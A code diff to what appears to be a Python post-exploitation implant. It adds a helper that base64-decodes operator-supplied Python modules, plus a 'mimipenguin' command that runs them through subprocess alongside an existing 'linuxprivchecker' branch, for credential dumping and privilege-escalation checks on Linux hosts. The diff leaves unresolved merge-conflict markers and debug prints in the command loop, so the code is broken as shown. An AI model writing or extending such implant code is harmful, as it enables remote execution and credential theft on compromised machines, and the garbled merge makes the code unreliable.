@@ -92,6 +92,18 @@ def decrypt_bytes_gzip(key, data):
     data = f.read()
   return data
 
+def python_prep_module(command):
+  split_command = command.strip().split()
+  args = split_command[1:]
+  pycode_index = args.index('-pycode')
+  encoded_module = args[pycode_index +1]
+  args.pop(pycode_index)
+  args.pop(pycode_index)
+  pycode = base64.b64decode(encoded_module)
+  pycode = 'import sys; sys.argv = sys.argv[1:];' + pycode
+  print "prepmodule gtg"
+  return (pycode,args)
+
 while(True):
   cstr=time.strftime("%%Y-%%m-%%d",time.gmtime());cstr=time.strptime(cstr,"%%Y-%%m-%%d")
   if cstr < kd:
@@ -167,17 +179,23 @@ while(True):
               except Exception as e:
                 returnval = "Error with source file: %%s" %% e              
             elif cmd.startswith("linuxprivchecker"):
-              args = cmd[len('linuxprivchecker'):].strip()
-              args = args.split()
-              pycode_index = args.index('-pycode')
-              encoded_module = args[pycode_index +1]
-              args.pop(pycode_index)
-              args.pop(pycode_index)
-              pycode = base64.b64decode(encoded_module)
-              process = ['python', '-c', pycode]
-              pycode = 'import sys; sys.argv = sys.argv[1:];' + pycode
+              command,args = python_prep_module(cmd)
+              print "elif lpc running"
               import subprocess
+              returnval = subprocess.check_output(['python2', '-c', command] + args)
+
+            elif cmd.startswith("mimipenguin"):
+              command,args = python_prep_module(cmd)
+              print "elif mimip"
+              print command
+              print args
+              import subprocess
+<<<<<<< HEAD
               returnval = subprocess.check_output(['python', '-c', pycode] + args)
+=======
+              returnval = subprocess.check_output(['python3', '-c', command] + args)
+
+>>>>>>> add python preloader
             elif cmd[:6] == "python":
               module = cmd.replace("python ","")
               try:
